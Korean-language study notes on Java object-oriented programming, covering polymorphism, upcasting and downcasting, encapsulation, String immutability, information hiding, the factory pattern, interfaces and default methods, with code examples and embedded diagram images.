같은 자료형에 여러가지 타입의 데이터를 대입하여 다양한 결과를 얻어낼 수 있는 성질
자바에선 대표적으로 오버로딩, 오버라이딩,업캐스팅, 다운캐스팅,인터페이스,추상메소드,추상클래스 
방법모두 다형성에 속한다고 생각하면된다.

즉, 다형성은 클래스가 상속관계에 있을 때 나타나는 다채로운 성질인 것이다.

예를들어 일반 TV클래스와 SmartTv 클래스가 상속관계를 맺었다고 가정하자

TV클래스에는 전원,볼륨,채널 켜기/끄기 기능 밖에 없고, 스마트 TV클래스에는 기본 TV동작 메서드를
상속하고 추가적으로 AI기능과 쇼핑기능이 있다.

class TV {
    void powerOn_Off() {} //전원 켜기/끄기
    void volumeOn_Off() {} //볼륨 켜기/끄기
    void channelOn_Off() {} //채널 돌리기
}

class SmartTV extends TV {
    void AI_Assistance() {} //인공지능 기능
    void shopping() {} //쇼핑하기
}

//여기서 보통우리는 일반적으로 동일한 클래스 타입의 참조변수를 생성해 초기화하여 사용해왔었다.
TV tv_remotecontrol = new TV();
SmartTV smart_remotecontrol = new SmartTV();


//그렇지만 만일 부모 자식 상속관계에 있으면 다음과 같이 부모타입으로 자식클래스타입을 받아
초기화 할 수 있다.

TV tv_remoteControl = new SmartTV();
//SmartTV의 인스턴스를 생성하고, 이 인스턴스의 주소값을 참조변수 remoteControl에 대입한다.(부모)
//마치 일반TV 리모콘으로 스마트티비를 사용할수있다. poweronoff,volumn,channel
//하지만 스마트 TV의 기능은 쇼핑하기,인공지능 기능은 안된다!!!!!!!!
```

```
#)upcasting, downcasting
기본형 타입을 서로 형변환 할 수 있듯이, 자바의 상속관계에 있는 부모와 자식클래스 간에는
서로간의 형변환이 가능하다.
클래스는 reference타입으로 분류되니 이를 참조형캐스팅이라고 불린다.

class Parent {
	String name;
    int age;
}

class Child extends Parent {
	int number;
}

Parent p = new Parent(); 
Child c = new Child();

Child c = new Parent(); //에러가난다. c.name = "dd" 
 
 //이클립스 에디터에는 에러가 안나지만 실행하면 에러가난다.
chile c = (Child) new Parent;

Parent p2 = (Parent)c; // 업캐스팅 - 자식에서 부모로
Child c2 = (Child)p2; // 다운캐스팅 - 부모에서 자식으로
```
```
다운캐스팅은 괄호를 생략할 수 없다.
다운캐스팅의 진정한 의미는 부모클래스로 업 캐스팅된 자식클래스를 복구하는 것이다.
즉, 원래있던 기능을 찾겠다는 의미

//원래 부모인애를 다운캐스팅하면 당연히 안된다. (에디터에는 에러가 안뜸)		
Parent p1 = new Parent();
Child c1 = (Child)p1;

//그럼 다운캐스팅이 되냐??
//원래의 값이 중요하다 - 자식이 원래의 값이여야된다. 자식 -> (업) -> 부모 -> (다운) -> 자식
//원래의 값이 부모이면 - 부모 -> (다운) -> ? 어디로가야하오
Child c = new Child();
Parent p = (Parent)c;
c = (Child)p;
c.name="dd";

```
```
#) 아래는 위와 비슷해보이지만 된다.
원래의 값이 중요하다.

class Unit {
    public void attack() {
        System.out.println("유닛 공격");
    }
}

class Zealot extends Unit {
    public void attack() { //오버라이딩
        System.out.println("찌르기");
    }

    public void teleportation() { //별도메서드구현
        System.out.println("프로토스 워프");
    }
}

public class ByteLegth {

	public static void main(String[] args) throws UnsupportedEncodingException {
		Unit unit_up;
        Zealot zealot = new Zealot();

        unit_up = zealot; // 업캐스팅(new로 만든게 원래의값이다. 본질)

        //원래는 여기서 다운캐스팅할때 에러가나는데 new로 만든게 본질이라서 가능
        Zealot unit_down = (Zealot) unit_up; // 캐스팅 연산자는 생략 불가능. 반드시 기재
        unit_down.attack(); // "찌르기"
        unit_down.teleportation(); // "프로토스 워프"
		
	}
}
```



```
이러한 참조형 캐스팅의 대표적인 ArrayList 자료형의 선언문을 볼 수있다
이것도 업캐스팅이다.
업캐스팅은 캐스팅 연산자 괄호를 생략할 수 있다.
업캐스팅을하고 메소드를 실행할 때, 만일 자식 클래스에서 오버라이딩한 메서드가 있을 경우,
부모클래스의 메서드가 아닌 오버라이딩된 메서드가 실행되게 된다.

List<int> l = new ArrayList()<>;
```
```
class Unit {
    public void attack() {
        System.out.println("유닛 공격");
    }
}

class Zealot extends Unit {
    public void attack() {
        System.out.println("찌르기");
    }

    public void teleportation() {
        System.out.println("프로토스 워프");
    }
}

public class Main {
    public static void main(String[] args) {
    
        Unit unit_up;
        Zealot zealot = new Zealot();
        
        // * 업캐스팅(upcasting)
		unit_up = (Unit) zealot;

		//괄호생략 업캐스팅
		unit_up = zealot; // 업캐스팅은 형변환 괄호 생략 가능
    }
}
```
```
#)업캐스팅 멤버제한
부모를 상속해서 멤버가 많은 자식 클래스에서 부모클래스로 업캐스팅했으니 당연히 멤버갯수가 감소한다.
이는 실행할 수 있는 속성과 메서드가 제한된다는 뜻이다.
근데, 부모에 attack함수가있고 자식에도 attack함수가 오버라이딩되있으면 쓸수있다.
단, 자식에만 attack이 있으면 못쓴다.
```
```
#) 그럼 반대상황을 보자
SmartTV smart_remotecontrol = new TV(); 
즉, 스마트티비 리모콘으로 일반TV를 다루는 것이다.

그런데 만일 스마트티비에서만 가능한 버튼을 누르면 어떻게될까??
일반티비에는 해당 메서드(스마트티비메소드)가 없기 때문에 수신하면 오류를 일으킬것이다.

근데 이렇게 오류를 일으켜서 망가지면 서비스센터가 터질것이니까

그냥 스마트 TV리모콘으로는 일반 TV를 다루지 못하게 원천차단하는 것이 효율적이다.

따라서 개발자의 부주의로 인한 프로그램에러를 원천차단하기 위해서 일반적으로 자바에서는
아래 코드는 옳지 않다하여 에러가 나오게된다.

public class Main2 {
    public static void main(String[] args) {
        TV remoteControl = new SmartTV(); //이거는 정상

        SmartTV smart_remoteControl = new TV() //빨간불이뜬다.
    }
}


하지만 아무리 생각해도 스마트 TV 리모콘으로 일반TV를 아예 못다룬다는 것은 뭔가 불만이다.
안그러면 일반리모콘을 사야되기 때문이다.

그게 업,다운케스팅이다.

```

```
#)자료형 다형성

TV tv = new SmartTV() //이렇게 쓰는 것이 다형성인데 왜 쓰는 걸까?
핵심은 '타입묶음"이다.

//아래는 다형성을 안썻을때다.
그래서 뭔가 계속 반복되는 느낌이 있다.
class Rectangle {
}

class Triangle {
}

class Circle {
}

ArrayList<Rectangle> rectangles = new ArrayList<>();
rectangles.add(new Rectangle(1,2,3,4));
rectangles.add(new Rectangle(10,20,30,40));
rectangles.forEach(each -> System.out.println(each));

ArrayList<Triangle> triangles = new ArrayList<>();
triangles.add(new Triangle(1,2,3));
triangles.add(new Triangle(10,20,30));
triangles.forEach(each -> System.out.println(each));

ArrayList<Circle> circles = new ArrayList<>();
circles.add(new Circle());
circles.add(new Circle());
circles.forEach(each -> System.out.println(each));

```

```
#) 다형성 사용
shape라는 자료형으로 묶어 코드를 압축
class Shape {
}

class Rectangle extends Shape {
}

class Triangle extends Shape {
}

class Circle extends Shape {
}

ArrayList<Shape> shapes = new ArrayList<>(); //Shape이라는 부모에 다 넣음
shapes.add(new Rectangle(1,2,3,4));
shapes.add(new Rectangle(10,20,30,40));
shapes.add(new Triangle(1,2,3));
shapes.add(new Triangle(10,20,30));
shapes.add(new Circle());
shapes.add(new Circle());
shapes.forEach(each -> System.out.println(each));

만일 각 자식클래스에서 특수한 전용 메서드를 사용해야한다고 하면
오버라이딩을 통해하거나, 따로 그 요소만 빼서 다운캐스팅을 시켜 메서드 실행해주면된다.
```

```
#) 매개변수로 다형성을 사용하지 않은 예

bark메서드에 매개변수로 새로운 객체 타입을 전달 
class Tiger {
    String lang = "어흥";
}

class Lion {
    String lang = "으르렁";
}

class Dog {
    String lang = "멍멍";
}

class Bark {
	// 메소드 오버로딩
    void bark(Tiger tiger) {
        System.out.println(tiger.lang);
    }

    void bark(Lion lion) {
        System.out.println(lion.lang);
    }

    void bark(Dog dog) {
        System.out.println(dog.lang);
    }
}

public class Main2 {
    public static void main(String[] args) {

        Tiger tiger = new Tiger();
        Lion lion = new Lion();
        Dog dog = new Dog();

        Bark command = new Bark();
        command.bark(tiger); // 어흥
        command.bark(lion); // 으르렁
        command.bark(dog); // 멍멍
    }
}

//해당방법의 문제점은 Cat클래스가 추가되면 class Bark에 또 메소드 cat을 추가, 삭제도 마찬가지
그래서 번거롭다.
```

```
#) 그래서 Animal 인터페이스를 셍성하고 각 클래스마다 인터페이스를 구현하도록 하면된다.

interface Animal {
    void start(); //해당 메서드를 구현해야한다. implements 한쪽에서
}

class Tiger implements Animal {
    String lang = "어흥";

    public void start() { //인터페이스 구현
        System.out.println(this.lang);
    }
}

class Lion implements Animal {
    String lang = "으르렁";

    public void start() { //인터페이스 구현
        System.out.println(this.lang);
    }
}

class Dog implements Animal {
    String lang = "멍멍";

    public void start() { //인터페이스 구현
        System.out.println(this.lang);
    }
}

class Bark {
    void bark(Animal animal) {
        animal.start();
    }
}

public class Main2 {
    public static void main(String[] args) {

        Tiger tiger = new Tiger();
        Lion lion = new Lion();
        Dog dog = new Dog();

        Bark command = new Bark();
        command.bark(tiger); // 어흥
        command.bark(lion); // 으르렁
        command.bark(dog); // 멍멍
    }
}
```

```
꼭 객체 타입관점에서 뿐만 아니라 메서드를 확장하거나 재정의하는 오버로딩,오버라이딩도 메소드가
다형해지기 때문에 자바의 다형성 특징 중 하나에 속한다고 볼 수 있다.

class Parent {
	// 오버로딩(매개변수만 다르게)
	public void print(int value) {
		System.out.println("숫자 출력 = " + value);
	}
   	// 오버로딩(매개변수만 다르게)
	public void print(String value) {
		System.out.println("문자 출력 = " + value);
	}
    
    public void add(int x, int y) {
		System.out.println(x + y);
	}
}

class Child extends Parent {
	// 오버라이딩(부모에있는걸 씀)
	public void add(int x, int y) {
		System.out.println((x + y) * 2);
	}
}

class Main{
	public void main(String[]args) {
		Parent p = new Parent();
        p.print(100);     // 결과 : 숫자 출력 = 100 (오버로딩)
		p.print("test");   // 결과 : 문자 출력 = "test" (오버로딩)
        p.add(1,2); // 결과 : 3
        
        Parent p2 = new Child();
        p2.add(1,2); // 결과 : 6 (오버라이딩-부모에도 add함수가 있기때문에 자식의 add사용가능)
	}
}
```

```
class Time {
    private int hour; // hour는 외부에서 접근하지 못하게private으로 선언한다.
	
    // Setter
    public void setHour(int hour) {
        if (hour < 0 || hour > 24) { // hour에 대한 유효성 검사
            return;
        } else {
            this.hour = hour;
        }
    }
	
    // Getter
    public int getHour() {
        return hour;
    }
}

public class Main {
    public static void main(String[] args) {
        MyTime time = new MyTime();
        
        // 유효하지 않은 parameter 입력
        time.setHour(25); 
        System.out.println("Hour: " + time.getHour()); // 0
		
        // 유효한 parameter 입력
        time.setHour(13); 
        System.out.println("Hour: " + time.getHour()); // 13
    } 
}

위의 코드는 시간을 메서드로 입력받고, 출력하는 아주 간단한 캡슐화 예제이다.
여기서 클래스의 hour 멤버변수는 private로 선언함으로써 다른클래스에서의 접근을 제한해 두었다.

그리고 private hour 변수를 다루기 위해서는 setter, getter의 호출을 통해서만 가능하다.
```

<h3>String 의 특징</h3>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/3.PNG" width="650" height="400" /><br><br>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/4.PNG" width="650" height="400" /><br><br>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/5.PNG" width="650" height="400" /><br><br>

```
#)그렇다면 왜 불변으로 설계되었을까

첫번째는 JVM(자바 가싱 머신) 에서는 따로 String Constant Pool 이라는 독립적인 영역을 만들고 문자열들을 Constant 화 하여 다른 변수 혹은 객체들과 공유하게 되는데, 이 과정에서 데이터 캐싱이 일어나고 그 만큼 성능적 이득을 취할 수 있기 때문이다.


두번째는 데이터가 불변(immutable) 하다면 Multi-Thread 환경에서 동기화 문제가 발생하지 않기 때문에 더욱 safe 한 결과를 낼 수 있기 때문이다.


세번째는 보안(Security) 적인 측면을 들 수 있다.
예를 들어 데이터베이스 사용자 이름, 암호는 데이터베이스 연결을 수신하기 위해 문자열로 전달되는데, 만일 번지수의 문자열 값이 변경이 가능하다면 해커가 참조 값을 변경하여 애플리케이션에 보안 문제를 일으킬 수 있다.
```

```
#)자바 String 주소할당 방식
자바에서 String 변수를 선언하는 방법은 대표적으로 두가지 방식이 있다.
1. 리터럴을 이용한 방식
2. new 연산자를 이용한 방식

String str1 = "Hello" //문자열 리터럴을 이용한 방식
String str2 = "Hello"

String str3 = new String("Hello"); //new 연산자 이용
String str4 = new String("Hello");

이 둘의 차이는 뭘까??/

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/6.PNG" width="650" height="500" /><br><br>

> 여기서 봐야할 것은 문자열 리터럴 값으로 할당한 두 변수 str1,str2 이다<br>
같은 메모리 주소를 가리킨다는 것이다.

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/7.PNG" width="650" height="500" /><br><br>

---
<h3>문자열 비교, ==, equals() 차이</h3>

```
String str1 = "Hello";
String str2 = "Hello";

String str3 = new String("Hello");
String str4 = new String("Hello");

str1 == str2 (true)

str3 == str4 (false) 서로다른 주소

str3.equals(str4) //문자열비교는 이렇게해야한다

str1 == str3 //false
str3.equals(str1) //true
```
```
#)정보은닉(OOP의 핵심)
객체지향 언어적 요소를 활용하여 객체에 대한 구체적인 정보를 노출시키지 않도록 하는
기법을 칭한다.

캡슐화 == 정보은닉 보다는 정보은닉 기법중 하나가 캡슐화라는 것이다.

자바프로그램의 정보은닉기법은 대표적으로 3가지가 있다.
1. 객체의 구체적인 타입은닉(=업캐스팅)
2. 객체의 필드 및 메소드 은닉(=캡슐화)
3. 구현은닉(=인터페이스 & 추상클래스)

업캐스팅과 인터페이스 구현역시 정보은닉 측면에 포함된다.
부모클래스타입으로 통합을 하거나 인터페이스 타입을 사용하는 것 역시
구체적인 클래스 타입을 은닉함으로써 다형하게 사용할 수 있기 때문이다.

정보 은닉 이라는 단어를 보자면 무언가 정보를 은닉하여 보안적인 효과를 얻는 것 같다.
그러나 보안적인 측면 뿐만 아니라, 은닉되어 알필요가 없어 덜 알아도 되어 덜 공부하여도 간편하게 사용할 수 있게 해주는 의미도 내포한다.
우리가 자동차를 몰때 엔진이 어떻게 구동되어 바퀴가 굴러가는지 지식 필요없이 페달만 밟으면 자동차가 굴러간다.
이것이 자동차 원리 설계 정보를 은닉함으로서 경쟁사로부터 제품내부를 알지못하게 보안하는 효과도 있지만 소비자가 페달만 밟으면 작동하도록 단순화 한것도 포함한다. 이는 추상화 개념도 연결되는 대목이기도 하다.
 
객체 지향 언어를 통해 만들어진 디자인 패턴과 같이 좋은 설계를 대표 할만한 것들은, 사실 거슬러 올라기자면 정보 은닉 기법을 통해 얻는 이득을 극대화 하기 위해 만들어진 것들이다.
객체지향의 설계 원칙(SOLID)Visit Website 과 각종 객체지향 설계에 관련된 격언들도 역시 정보 은닉에 기반을 두었다고 해도 과언이 아니다.
따라서 정보 은닉 개념을 잘 알고 있다면, 그에 파생된 oop 패턴 기법들에 대해 왜 이런 패턴이 생겨났는지 그로 인해 어떠한 이득을 얻을 수 있는지 자연스럽게 이해할 수 있게 된다.
```

```
#)객체의 은닉타입(업캐스팅)
사실 자식 객체의 타입을 부모 객체의 타입으로 형변환하는 업캐스팅도 일종의 정보은닉이다
왜냐하면 구체적인 자식객체의 타입을 은닉함으로써 얻는 효과가 있기때문이다(다형성)

예를들어 아래와 같이 Rectangle클래스를 직접 정의하여 메인메소드에서 사용한다면, 결국 이것은 Rectangle이라는 객체에 전적으로 의존하는 코드가 된다.

만일 Rectangle클래스 구성에 무슨 문제가 생기면 메인메소드도 영향을 받는다.

class Rectangle{
    public void rectangle() {
        System.out.println("rectangle");
    }
}
class Myclass {
    public void method() {
        Rectangle rectangle = new Recatangle();
        rectangle.rectangle(); //Myclass 클래스는 Rectangle 클래스에 의존적인 코드
    }
}


만약 Rectangle과 유사한 기능을 하는 객체 Square나 Triangle을 추가로 구현한다고 가정
그리고 기획이 바뀌어 Rectangle 대신 Triangle을 사용하도록 설계서가 바뀌었다고 하자
현재 상태로서는 메인메소드에 있는 초기화코드부터 메서드 사용코드를 통째로 바꿔야한다.
```

```
따라서 Rectangle, Triangle 등 클래스 타입을 하나의 타입으로 통합 할 수 있는 Shape이라는
추상클래스를 만들어 다형성의 효과를 이용해 구현해준다.
추상메소드 draw()를 구현떠넘기기

abstract class Shape { //즉, 이걸 상속받으면 아래있는걸 구현해야한다.
    //하나의 공통 메소드로 각자식 클래스 고유의 메서드동작이 실행되도록 추상화
    abstract public void draw()
}

class Rectangle extends Shape {
    //오버라이딩이랑 비슷
    public void draw() {
        rectangle();
    }
    private void rectangle() { //내부메서드만 접근가능
        System.out.println("rectangle");
    }
}

class Triangle extends Shape {
    public void draw() {
        triangle();
    }
    private void triangle() { //내부메서드만 접근가능
        System.out.println("triangle");
    }
}

public class Myclass {
    public void method() {
        Shape shape = new Rectangle();

        shape.draw();//알아서 찾아간다.
        
        이렇게하면서 생성 이후에는 Shape 클래스의 draw()메소드만을 호출함으로써,
        Rectangle클래스와 관련된 메소드 private void rectangle() 가 간접적으로
        호출된다. 결국 객체타입과 메서드를 은닉한 것이다.
    }
}
```
```
#) 이러한 은닉을 통해 얻을 수 있는 이점은
Rectangle의 생성코드(new) 이후에는 어떤 코드도 Recangle클래스에 의존하지 않는다.
Shape 클래스로 묶었으니까 Shape 클래스만 신경쓰면된다.

따라서 Rectangle 대신에 Triangle을 사용하고 싶어졌을 때에는 new Rectangle() 대신 new Triangle()을 생성하도록 변수 할당문을 수정 해주기만 하면 된다. 

그러면 그 이후의 코드들은 전혀 수정될 필요가 없다. (결국 정보 은닉의 효과로 다형성의 효과를 누리게 되는 것과 같다)


public class Myclass {
    public void method() {
        Shape shape = new Triangle(); //변수할당부분만 바꿔주면 draw를 안바꿔도된다.
        shape.draw(); //출력: triangle
    }
}
```
```
만약에 완전히 객체를 Triangle로 변경하는게 아닌 Rectangle을 사용하다가 아주 잠시 메서드를 실행하기 위해 Triangle을 사용해야 할 경우도 발생할 수 있다.

이때는 다운캐스팅(downcasting)을 통해 동적으로 기능을 교체하면된다.

즉, 이미 선언되어 있는 shape 참조 변수에 (Triangle) 캐스팅만 해주면 기능 전환도 동적으로 쉽게 할 수 있다.

public class Myclass {
    public void method() {
        Shape shape = new Rectangle();
        shape.draw();  //출력: rectangle

        //다운캐스팅을하고 메서드 실행
        ((Triangle) shape).draw(); 
    }
}

```
```
#)더욱 더 객체를 은닉해라(디자인패턴)
위의 코드도 사실 완벽한 것은 아니다.
좀더 리팩토링해줘야하는데 그게 디자인패턴이다.

다음코드는 간략하게 리팩토링 해본 디자인패턴(팩토리패턴) 코드의 예제이다.


abstract class Shape{
    abstract public void draw(); //상속하면 이메서드를 구현해야한다.
}

class Rectangle extends Shape{
    public void draw(){ 
    	rectangle();
    }   
    private void rectangle(){  //본인함수
    	System.out.println("rectangle"); 
    }
}

class Triangle extends Shape{
    public void draw(){ 
    	triangle();
    }   
    private void triangle(){ //본인함수
    	System.out.println("triangle"); 
    }
}

// Shape에 연관된 자식 객체들을 찍어내는 팩토리라는 클래스를 새로 만든다.
class ShapeFactory{
    public Shape create_R() { // 리턴 타입이 Shape
    	return new Rectangle(); 
    }
    public Shape create_T() { // 리턴 타입이 Shape
    	return new Triangle(); 
    }
}

public class Myclass {
    public void method() {
        ShapeFactory factory = new ShapeFactory();
    
        Shape shape = factory.create_T(); //return이 인터페이스니까 인터페이스인 Shape로 받았음

        shape.draw(); //출력: triangle
    }
}

이렇게하면 오로지 Shape 클래스와 ShapeFactory 클래스만으로 Rectangle, Triangle 클래스를 생성할 수 있게 된다.

즉, 완변히 구체적인 객체에 대한 정보 은닉을 한것이다.
```

```
또 다른 은닉 기술인 객체의 필드 & 메소드 은닉이다.

class Process {
    public void init(){}
    public void process(){}
    public void release(){}
}

동작 메소드가 모두 public 으로 지정되어있다.
이말은 외부에서 이 클래스의 객체를 사용하는 코드에 대해서는 모두 3개의
메소드에 의존하게 된다는 말이다.

이는 혹시라도 의존되어있는 Process객체를 수정하거나 제거를 하는 등의 수정이 발생했을 때, Process 클래스 자원을 사용하는 클래스에서 방대하 코드 수정을 해야한다.

또한 불필요하게 많은 수의 메소드를 노출시키되면, 호출 순서에 대해 연관관계를 유추하는데 어려움이 생기고 ,어느 메서드가 중요한지 중요도를 유추하는데 있어 어려움이 생긴다.
 
그래서 프로세스의 동작에 관한 메서드들을 모두 private화 하여 은닉시키고 work() 라는 퍼블릭 메서드를 추가해 안에다 메서드 실행을 해줌으로써 극복 할 수 있다.

class Process{
    private void init(){} // 은닉 메서드(클래스내부에서만 호출가능)

    private void process(){} // 은닉 메서드(클래스내부에서만 호출가능)

    private void release(){} // 은닉 메서드(클래스내부에서만 호출가능)

    public void work(){ // 공개 메서드
        init(); // 은닉한 메서드 실행
        process();
        release();
    }
}

이를 통해 적절한 수준에서 메소드들이 공개(work)와 비공개로 나누어져 있기 때문에 어떤 메소드를 우선 살펴야 할지를 알 수 있으며, 또한 개별 메소드들의 호출 순서를 work() 메소드에서 정해주고 있기 때문에 Process 객체 사용에 대한 사용법을 적은 학습량으로 쉽게 사용이 가능해 진다.

그리고 메서드들을 은닉 함으로써 객체의 세부 내용을 덜 노출시키게 되어 보안에도 효과가 있게 된다.
 
이렇게 공개 메서드와 은닉 메서드를 구분하고 공개 메소드의 갯수를 최소화 시키는 이유가 바로 다음에 이어질 구현 은닉을 위한 설계이며 자바에서 인터페이스 라는 것을 사용하는 이유이기도 하다.
```
```
#)구현은닉(인터페이스)
위의 정보 은닉 멘토를 잘 받아들여, 변수를 private으로 선언하고 꼭 필요한 공개 메소드를 잘 구축한 좋은 클래스를 구성했다고 가정하자.

이렇게 클래스 구성을 해 놓으면 객체간에 의존성은 오직 공개 메소드에 의해서만 발생하게 된다.

그리고 이러한 공개 메소드를 은닉 메소드들과 구분하고 통합적으로 관리하기 위해서, 자바에서는 클래스와 유사하게 상속 가능한 타입이면서 구체적인 구현을 베제한 인터페이스(Interface)를 만들어 메소드 추상화를 통해 상속 시킬 공개 메서드를 통합적으로 관리하게 하였다.

이것이 왜 인터페이스(Interface)를 구현하여 추상 메소드를 정의하여 implements를 통해 재정의 규약을 설정하는, 우리가 지금까지 배우고 써먹었던 객체 지향적 프로그래밍의 이유가 바로 이것이다.

interface InterProcess {
    public void work(); // 추상 메소드
}

class Process implements InterProcess {
    private void init(){} // 은닉 메서드
    private void process(){} // 은닉 메서드
    private void release(){} // 은닉 메서드

    public void work(){ // 공개 메서드 + 메소드 구체화
        init(); 
        process();
        release();
    }
}

public class Main {
    public static void main(String[] args) {
        InterProcess c = new Process(); // 인터페이스 역시 상위 클래스 타입 처럼 이용될 수 있다
        c.work();
    }
}

인터페이스 역시 자바 참조 타입의 다형성의 원리를 그대로 이용할 수 있다.
그래서 Process 타입의 객체를 InterProcess 인터페이스 타입으로 할당 할 수 있는 것이다.

그리고 캡슐화를 통해 최소한으로 줄인 공개 메서드를 인터페이스의 추상 메소드와 연동이 되면서, Process 클래스의 기능 동작을 하는데 있어 업캐스팅으로 인한 멤버 제한과 같은 제한 요소는 없어진다.

이밖에 인터페이스를 이용하면 실질적 클래스 간의 의존 관계가 없어지면서 기능 확장에 있어 제약이 줄어들게 된다.

추가적으로 자바의 인터페이스에 대해 자세하고 확실하게 알고 싶다면 다음 포스팅을 참고하길 바란다.

```

```
인터페이스는 추상화와 상속과 더불어 다형성이라는 객체지향의 특징을 구현하는 핵심이다.

객체의 인스턴스 메소드를 이용하는 사용자 입장에서 그 객체의 내부 구현이 어떻든 깊이
학습할 필요없이 원하는 메서드만 호출하고 결과값을 받게 해주는 간편한 상호작용기능이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/8.PNG" width="650" height="500" /><br><br>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/9.PNG" width="650" height="500" /><br><br>
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/10.PNG" width="650" height="500" /><br><br>


```
#)인터페이스 일부구현일때
만일 클래스가 구현하는 인터페이스의 메서드중 일부만 구현한다면 abstract를 붙여서
추상클래스로 선언해야한다.

어찌보면 당연한게 인터페이스의 추상 메서드 멤버를 그대로 상속받기 때문에,
인터페이스를 상속한 클래스에서 메서드 구현을 안한다면,
곧 추상메서드를 가진 추상 클래스가 되기 때문이다.

interface Animal {
    void walk();
    void run();
    void breed();
}

//Animal 인터페이스를 일부만 구현하는 포유류 추상클래스
abstract class Mammamia implements Animal {
    public void walk() { ... }
    public void run() { ... }

    // public void breed() 는 자식 클래스에서 구체적으로 구현하도록 일부로 구현하지 않음 (추상 메서드로 처리)
}

class Lion extends Mammalia {
    @Override
    public void breed() { ... }
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/11.PNG" width="650" height="400" /><br><br>


```
interface Changeable {
    //채널을 바꾸는 기능의 메서드
    void change();
}

interface Powerable {
    //전원을 껐다 켰다 하는 메서드
    void power(boolean b)
};


//채널기능과 전원기능을 가진 인터페이스들을 하나의 인터페이스로 통합 상속
interface Controlable extends Changeable, Powerable {
    //인터페이스끼리 다중 상속하면 그대로 추상 멤버들을 물려받음
}

//클래스에 통합된 인터페이스를 그대로 상속
class MyObject implements Controlable {
    public void change() {
        System.out.println("채널을 바꾸는 기능");
    }
    public void power(boolean b) {
        System.out.println("전원을 껐다 켰다 하는 기능");
    }
}

public class Main {
    public static void main(String[] args) {
        //인터페이스 다형성(인터페이스를 타입으로 취급해서 업캐스팅가능)
        Controlable[] o = {new MyObject(), new MyObject()};
        o[0].change();
        o[0].power(true);

        // 각각 단일 인터페이스로도 타입으로 사용이 가능하다. (그러나 지니고 있는 추상 메서드만 사용이 가능하다)
        Changeable inter1 = new Changeable();
        inter1.change(); 

        Powerable inter2 = new Powerable();
        inter2.power(true);
    }
}
```
```
[info]
[인터페이스의 extends는 상속이 아니다]
인터페이스는 하나의 타입이나 규격일 뿐이지 그 자체가 하나의 객체가 되는 것이 아니다. 따라서 엄밀히 말하자면, 인터페이스의 상속은 클래스의 상속처럼 부모의 속성과 동작을 물려받는 것이 아니다. 
정확히 말하면, 인터페이스의 상속은 규격이나 스펙 자체 혹은 기능 자체의 선언을 물려받은 것이다. 규격이나 스펙을 물려받아서 새로운 스펙을 만든다면 기존 여러 개의 스펙을 조합해서 하나로 묶거나 기존의 스펙을 고스란히 물려받은 후에 다시 추가적인 기능을 가지게 하는 것이다.
```

```
#) 인터페이스 상수 필드 상속관계
클래스의 상속일 경우 클래스 필드 멤버끼리 상속되어 덮어씌워지지만,
인터페이스의 필드들은 모두 public static final 이기에, 서로 상속을 해도 독립적으로 운용


interface Iflower {
    int ex = 10; //앞에 public static final 생략 
}
interface IPlant extends Iflower {
    int ex = 20; //앞에 public static final 생략
}

class Tulip implements IPlant {
    int ex = 30; //그냥 인스턴스 변수
}

public class Main {
	public static void main(String[] args) {
        // 클래스 타입 객체로 ex 멤버에 접근하면, 클래스 인스턴스 변수로 접근
        Tulip t =  new Tulip();
        System.out.println(t.ex); // 30

        // 인터페이스 타입 객체로 멤버에 접근하면, 인터페이스 static 상수로 접근
        Iflower a = new Tulip();
        System.out.println(a.ex); // 10 - 좋지않은 방법
        System.out.println(Iflower.ex); // 10 - 클래스 static 처럼 '인터페이스.멤버' 로 접근

        IPlant b = new Tulip();
        System.out.println(b.ex); // 20 - 좋지않은 방법
        System.out.println(IPlant.ex); // 20 - 클래스 static 처럼 '인터페이스.멤버' 로 접근
    }
}
```
```
#)default 메서드
등장이유: 기존 인터페이스에 추상메서드를 추가해버리면, implements 시에 하나더 구현해야하므로 모든 클래스에 수정이 필요해지기때문에 추상메서드 대신에 디폴트메서드를
추가하여 해결했다고 보면된다.

- 디폴트 메서드는 앞에 키워드 default를 붙이며 구현부(몸체)!!!!!가 있어야한다.
- 디폴트 메서드 역시 접근제어저가 public 이며 생략가능
- 자식클래스(구현체)에서 default 메소드를 오버라이딩하여 재정의 가능
- 보통 인터페이스를 구현한 이후, 수정과정에서 인터페이스 모든 구현체에게 수정 없이 광역으로 함수를 만들어주고 싶을 때 사용된다. (대신 모든 구현체가 원하는 값을 return 하게 보장하기 위해 @implSpec 자바 doc 태그를 사용해 문서화 해줘야 한다)
-주의해야할점은 인터페이스는 Object 클래스를 상속받지 않기 때문에, Object클래스가
제공하는 (equals,hashCode 등)는 따로 직접 정의해야한다.

interface Calculator {
    int plus(int i, int j);
    int multiple(int i, int j);

    //default로 선언함으로 메소드를 구현할 수 있다.
    default int sub(int i, int j) {
        return i-j;
    }
}

// Calculator인터페이스를 구현한 MyCalculator클래스
class MyCalculator implements Calculator {
    // 추상 메서드만 구현해줌(디폴트메서드는 구현하지않아도 쓸수있다)
    @Override
    public int plus(int i, int j) { return i + j; }
    @Override
    public int multiple(int i, int j) { return i * j; }
}

